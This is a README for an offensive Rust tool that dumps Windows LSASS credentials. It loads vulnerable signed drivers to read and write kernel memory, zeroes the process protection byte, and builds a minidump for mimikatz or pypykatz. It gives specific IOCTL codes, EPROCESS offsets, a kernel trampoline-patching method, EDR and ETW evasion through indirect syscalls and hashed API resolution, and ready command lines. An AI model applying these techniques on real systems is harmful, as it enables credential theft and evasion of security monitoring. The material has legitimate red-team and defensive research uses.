# 🔓 LSASS Dumper

> BYOVD-based LSASS credential dumper — bypasses PPL protection via kernel R/W or DM_KernelSyscall physical memory exploitation, builds a hand-crafted minidump compatible with pypykatz/mimikatz.

## ⚠️ Disclaimer

This tool is for **authorized security research and red team operations only**. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse.

---

## Features

- **BYOVD Kernel R/W** — Exploits vulnerable signed drivers to read/write arbitrary kernel memory
- **PPL Bypass** — Disables LSASS Protected Process Light by zeroing `EPROCESS.Protection`
- **Hand-crafted Minidump** — Builds MDMP format manually, no `MiniDumpWriteDump` (heavily hooked by EDRs)
- **Dynamic API Resolution** — All sensitive APIs resolved at runtime via PEB walk + DJB2 hashing (clean IAT)
- **Indirect Syscalls** — Hell's Gate / Halo's Gate for NTAPI calls, bypassing user-mode hooks
- **XOR Encryption** — Optional encryption of dump output to avoid on-disk credential exposure
- **Multi-method Handle Acquisition** — Direct / Fork / Duplicate strategies for opening LSASS
- **Minimal Footprint** — Release binary ~90KB with `opt-level=z`, LTO, strip

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        main.rs                              │
│  CLI parsing, orchestration, SeDebugPrivilege enable        │
├─────────────┬───────────────┬───────────────┬───────────────┤
│ resolver.rs │   driver.rs   │  kernel_rw.rs │    ppl.rs     │
│ PEB walk    │ SCM load/     │ IOCTL-based   │ EPROCESS walk │
│ DJB2 hash   │ unload driver │ kernel R/W    │ PPL zeroing   │
│ API resolve │               │ (viragt mode) │ ntoskrnl base │
├─────────────┼───────────────┼───────────────┼───────────────┤
│ sfdrv64.rs  │ handle.rs     │  minidump.rs  │  syscall.rs   │
│ DM_Kernel   │ LSASS PID     │ MDMP builder  │ Hell's Gate   │
│ Syscall via │ OpenProcess   │ memory dump   │ indirect call │
│ sfdrvx64.sys│               │               │               │
├─────────────┼───────────────┼───────────────┼───────────────┤
│ offsets.rs  │  crypto.rs    │  etw.rs       │  seclogon.rs  │
│ EPROCESS    │  XOR encrypt  │  ETW bypass   │  handle leak  │
│ per-build   │               │               │               │
└─────────────┴───────────────┴───────────────┴───────────────┘
```

---

## Attack Chains

### Mode 1: viragt (Virtual Memory IOCTL)
```
Step 0  ─→  PEB Walk → Resolve APIs dynamically (no IAT footprint)
Step 1  ─→  SCM → Load vulnerable driver as kernel service
Step 2  ─→  CreateFileW("\\.\viragtlt") → Open kernel R/W channel
Step 3  ─→  Kernel R/W → Walk EPROCESS list → Zero LSASS Protection byte
Step 4  ─→  NtOpenProcess(PROCESS_ALL_ACCESS) → Get LSASS handle
Step 5  ─→  VirtualQueryEx + ReadProcessMemory → Build minidump
Step 6  ─→  Restore original Protection value
Step 7  ─→  Cleanup (close handles, optionally unload driver)
```

### Mode 2: sfdrv (DM_KernelSyscall — Physical Memory)
```
Step 0  ─→  PEB Walk → Resolve APIs dynamically
Step 1  ─→  SCM → Load sfdrvx64.sys as kernel service
Step 2  ─→  Open "\\.\Speedfan" → Locate NtShutdownSystem in physical memory
            ├── Registry → Physical memory ranges
            ├── LoadLibraryEx(ntoskrnl.exe) → NtShutdownSystem RVA + ref bytes
            └── Scan physical memory via IOCTL reads → Match → Verify trampoline
Step 3  ─→  Patch trampoline → JMP ZwOpenProcess → Call from user-mode
            → Kernel-mode ZwOpenProcess(LSASS, PROCESS_ALL_ACCESS)
            → ZwDuplicateObject → User-mode handle (bypasses PPL entirely)
Step 4  ─→  NtReadVirtualMemory → Build minidump
Step 5  ─→  Cleanup
```

> **Note**: DM_KernelSyscall mode does not need PPL/ETW bypass — all operations execute in Ring 0 via physical memory code patching (AxiomDumper technique).

---

## Technical Deep Dive

### 1. Dynamic API Resolution (`resolver.rs`)

All Win32/NT API calls are resolved at runtime to keep the Import Address Table clean:

```
TEB (gs:[0x60]) → PEB → PEB_LDR_DATA → InMemoryOrderModuleList
  ├── DJB2 hash compare module names
  │   ├── kernel32.dll
  │   ├── ntdll.dll
  │   └── advapi32.dll
  └── For each module: parse PE EAT → DJB2 hash function names → return pointer
```

**DJB2 Hash Algorithm:**
```rust
fn djb2(name: &str) -> u32 {
    let mut hash: u32 = 5381;
    for c in name.bytes() {
        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
    }
    hash
}
```

This avoids strings like `"NtOpenProcess"` appearing in the binary.

### 2. BYOVD Driver Loading (`driver.rs`)

Uses the Windows Service Control Manager to load the vulnerable driver:

```
OpenSCManagerW(SC_MANAGER_ALL_ACCESS)
  → CreateServiceW(SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START)
    → StartServiceW()
```

Implements RAII via `DriverGuard` — on drop: `ControlService(STOP)` → `DeleteService()`.  
For drivers that BSOD on unload (e.g., viragt64.sys), `--no-unload` uses `std::mem::forget()` to skip cleanup.

### 3. Kernel Read/Write

#### viragt64.sys Backend (`kernel_rw.rs`)

| Operation | IOCTL | Input Buffer Layout |
|-----------|-------|-------------------|
| **Read** | `0x82730028` | `[addr: u64 @0x00, len: u32 @0x18]` |
| **Write** | `0x8273007C` | `[dest: u64 @0x00, val1: u64 @0x08, val2: u64 @0x10]` |

- **Read**: Uses MDL mapping with per-byte `MmIsAddressValid` checks
- **Write**: Writes 2 QWORDs atomically via `_InterlockedExchange64` at DISPATCH_LEVEL
- **Sub-QWORD writes**: Read-modify-write pattern

#### sfdrvx64.sys Backend (`sfdrv64.rs`) — DM_KernelSyscall

| Operation | IOCTL | Input/Output Layout |
|-----------|-------|-------------------|
| **PhyRead** | `0x9C402428` | Input: `[phys_addr: u64]` → Output: `[N bytes]` |
| **PhyWrite** | `0x9C40242C` | Input: `[phys_addr: u64][data: N bytes]` |

Uses the SpeedFan driver's physical memory IOCTLs for AxiomDumper-style DM_KernelSyscall:
1. Scan physical memory for `ntoskrnl!NtShutdownSystem` code bytes
2. Patch with `JMP [target_func]` shellcode
3. Call `ntdll!NtShutdownSystem` from user-mode → executes target kernel function
4. Restore original bytes

This enables calling arbitrary kernel functions (ZwOpenProcess, ZwDuplicateObject, etc.) from user-mode, completely bypassing PPL, ETW, and SACL protections.

### 4. PPL Bypass (`ppl.rs`)

Protected Process Light prevents user-mode access to LSASS. Bypass via kernel memory manipulation:

```
1. NtQuerySystemInformation(SystemModuleInformation)
     → Get ntoskrnl.exe kernel base address

2. LoadLibraryExW("ntoskrnl.exe", DONT_RESOLVE_DLL_REFERENCES)
     → Map PE in userland → Parse EAT
     → Find PsInitialSystemProcess RVA

3. kernel_base + RVA = PsInitialSystemProcess address
     → Read pointer → System EPROCESS (PID 4)

4. Walk EPROCESS.ActiveProcessLinks doubly-linked list
     → Match UniqueProcessId == lsass_pid
     → Found target EPROCESS

5. Read EPROCESS.Protection (e.g., 0x61 = PsProtectedSignerLsa-Light)
     → Write 0x00 → PPL disabled
     → After dump: restore original value
```

Per-build EPROCESS offsets (from `offsets.rs`):
| Field | Win10 22H2 (19045) | Win11 23H2 (22631) |
|-------|--------------------|--------------------|
| `UniqueProcessId` | 0x440 | 0x440 |
| `ActiveProcessLinks` | 0x448 | 0x448 |
| `ImageFileName` | 0x5A8 | 0x5A8 |
| `Protection` | 0x87A | 0x87A |

### 5. Handle Acquisition (`handle.rs`)

Three strategies for obtaining a LSASS process handle:

| Method | Technique | Stealth |
|--------|-----------|---------|
| **Direct** | `NtOpenProcess(PROCESS_ALL_ACCESS)` | Low — logged by Sysmon Event 10 |
| **Fork** | `NtCreateProcessEx` to clone LSASS | Medium — dumps the clone |
| **Dup** | Find existing handle in another process | High — no new handle creation |

LSASS PID enumeration via `NtQuerySystemInformation(SystemProcessInformation)` — walks `SYSTEM_PROCESS_INFORMATION` linked list matching `"lsass.exe"`.

### 6. Minidump Construction (`minidump.rs`)

Builds a valid MDMP file **without calling `MiniDumpWriteDump`** (the most EDR-hooked API):

```
┌──────────────────────────┐
│    MINIDUMP_HEADER       │  "MDMP" magic + version 0xA793
│    (32 bytes)            │  + stream count + directory RVA
├──────────────────────────┤
│    Stream Directory      │  3 entries (SystemInfo, ModuleList, Memory64List)
│    (12 bytes × 3)        │
├──────────────────────────┤
│    SystemInfoStream      │  OS version, CPU architecture
├──────────────────────────┤
│    ModuleListStream      │  N × {base, size, name} for each DLL
│    + Module name strings │  UTF-16LE encoded paths
├──────────────────────────┤
│    Memory64ListStream    │  Region count + base RVA
│    + Descriptors[]       │  {start_addr, size} per region
├──────────────────────────┤
│    Raw Memory Data       │  Concatenated memory region contents
└──────────────────────────┘
```

Memory collection: `VirtualQueryEx` → filter `MEM_COMMIT` + readable protections → `ReadProcessMemory`.

### 7. Indirect Syscalls (`syscall.rs`)

Implements **Hell's Gate** + **Halo's Gate** to resolve syscall numbers at runtime:

```
1. Parse ntdll.dll EAT → find Zw* function address
2. Read prologue: mov r10, rcx / mov eax, SSN
   → Extract System Service Number (SSN)
3. If hooked (no mov eax pattern): search neighboring
   Zw* functions for SSN patterns (Halo's Gate)
4. Execute syscall via indirect jmp to ntdll syscall;ret gadget
```

This bypasses any user-mode API hooks placed by EDR products on ntdll.dll.

### 8. XOR Encryption (`crypto.rs`)

Optional dump encryption using a simple XOR cipher:

```
Key generation: RDTSC-seeded LCG (not cryptographic, but sufficient for obfuscation)
Output format:  [key_len: u32 LE] [key: N bytes] [encrypted_data]
```

---

## Supported Windows Versions

| Build | Version | Status |
|-------|---------|--------|
| 17763 | Win10 1809 / Server 2019 | ✅ |
| 18362 | Win10 1903 | ✅ |
| 18363 | Win10 1909 | ✅ |
| 19041 | Win10 2004 | ✅ |
| 19042 | Win10 20H2 | ✅ |
| 19043 | Win10 21H1 | ✅ |
| 19044 | Win10 21H2 | ✅ |
| 19045 | Win10 22H2 | ✅ |
| 22000 | Win11 21H2 | ✅ |
| 22621 | Win11 22H2 | ✅ |
| 22631 | Win11 23H2 | ✅ |
| 26100 | Win11 24H2 | ✅ |

---

## Usage

```bash
# Build
cargo build --release

cargo build --release --features driver-loader

# Mode 1: viragt64 — virtual memory R/W (requires PPL bypass)
lsass-dumper.exe -d viragt64.sys -s viragt64 -t viragt -m seclogon

# 模式 2：sfdrvx64 — DM_KernelSyscall（无需 PPL 绕过,建议使用 winio.sys）
lsass-dumper.exe -d winio.sys -s winio -t winio

# With encryption
lsass-dumper.exe -d winio.sys -s winio -t winio --encrypt

# Allow driver unload (dangerous for viragt64 — may BSOD)
lsass-dumper.exe --no-unload=false
```

### CLI Options

| Flag | Default | Description |
|------|---------|-------------|
| `-d, --driver` | `viragt64.sys` | Path to vulnerable driver |
| `-o, --output` | `lsass.dmp` | Output dump file path |
| `-s, --service-name` | `viragt64` | Windows service name |
| `-t, --driver-type` | `viragt` | Driver type: `viragt` / `sfdrv` |
| `-m, --method` | `seclogon` | Handle method (viragt only): `direct` / `fork` / `dup` / `seclogon` |
| `--encrypt` | `false` | XOR encrypt the dump |
| `--no-restore` | `false` | Skip restoring PPL after dump |
| `--no-unload` | `true` | Skip driver unload on exit |

### Parse the dump

```bash
# pypykatz
pypykatz lsa minidump lsass.dmp

# mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## Project Structure

```
src/
├── main.rs        # CLI, orchestration, SeDebugPrivilege
├── resolver.rs    # PEB walk + DJB2 hash API resolution
├── driver.rs      # SCM driver load/unload (RAII)
├── kernel_rw.rs   # Kernel R/W via viragt64.sys IOCTLs
├── sfdrv64.rs     # DM_KernelSyscall via sfdrvx64.sys physical memory R/W
├── ppl.rs         # PPL bypass (EPROCESS.Protection zeroing)
├── offsets.rs     # Per-build EPROCESS field offsets
├── handle.rs      # LSASS PID finder + handle acquisition
├── seclogon.rs    # Seclogon handle leak (PID spoofing)
├── minidump.rs    # Hand-crafted MDMP builder
├── syscall.rs     # Hell's Gate / Halo's Gate indirect syscalls
├── etw.rs         # ETW bypass (user-mode patch)
├── crypto.rs      # XOR encryption for dump output
└── dumper.rs      # (stub)
```

---

## Build

```bash
# Requirements
# - Rust toolchain (stable, x86_64-pc-windows-msvc)
# - Windows SDK (for windows crate bindings)

cargo build --release

# Output: target/release/lsass-dumper.exe (~90KB)
```

Release profile optimizations:
| Setting | Value | Purpose |
|---------|-------|---------|
| `opt-level` | `z` | Optimize for size |
| `lto` | `true` | Link-time optimization |
| `codegen-units` | `1` | Maximum optimization |
| `panic` | `abort` | No unwind tables |
| `strip` | `true` | Remove symbols |

---

## References

- [AxiomDumper](https://github.com/mallo-m/AxiomDumper) — DM_KernelSyscall technique for physical memory code execution
- [mimikatz](https://github.com/gentilkiwi/mimikatz) — Original LSASS credential extraction
- [pypykatz](https://github.com/skelsec/pypykatz) — Python LSASS parser
- [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) — PPL bypass via RTCore64
- [Hell's Gate](https://github.com/am0nsec/HellsGate) — Dynamic syscall resolution
- [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) — Syscall resolution for hooked ntdll
- [BYOVD](https://github.com/BlackSnufkin/BYOVD) — Bring Your Own Vulnerable Driver framework
- [LOLDrivers](https://www.loldrivers.io/) — Living Off The Land Drivers catalog

---

## License

For authorized security research use only. No warranty provided.
